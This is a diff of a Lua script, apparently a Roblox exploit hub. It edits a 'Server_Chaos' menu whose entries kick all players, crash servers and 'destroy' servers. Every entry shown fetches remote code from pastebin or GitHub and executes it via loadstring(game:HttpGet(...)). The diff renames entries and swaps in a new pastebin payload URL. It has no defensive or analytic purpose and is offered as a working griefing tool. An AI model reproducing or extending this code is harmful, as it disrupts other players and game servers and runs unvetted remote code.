@@ -166,7 +166,7 @@ end)
 		end},
 	},
 	Server_Chaos = {
-		{"Destroy Server (KickGUI)", function()
+		{"Kick All (FE KickGUI)", function()
 			loadstring(game:HttpGet("https://pastebin.com/raw/ZXAZyL3q",true))()
 		end},
 		{"Crash Server (Avatar Change Games)", function()
@@ -182,8 +182,8 @@ end)
 			--// Blackhole
 loadstring(game:HttpGet("https://raw.githubusercontent.com/deprivationist/Sypher-Hub-NDS/refs/heads/main/Sypher%20Hub%20NDS.txt"))()
 		end},
-		{"Server Destruction (Admin need)", function()
-			loadstring(game:HttpGet('https://raw.githubusercontent.com/SuperHackerYT/AdminThingy/refs/heads/main/Protected_3075172660359461.lua.txt'))()
+		{"ServerDestroy GUI (Admin & F3X)", function()
+			loadstring(game:HttpGet('https://pastebin.com/raw/FgMrTkpq'))()
 		end},
 		{"Summon C00lkidd (Visual)", function()
 			
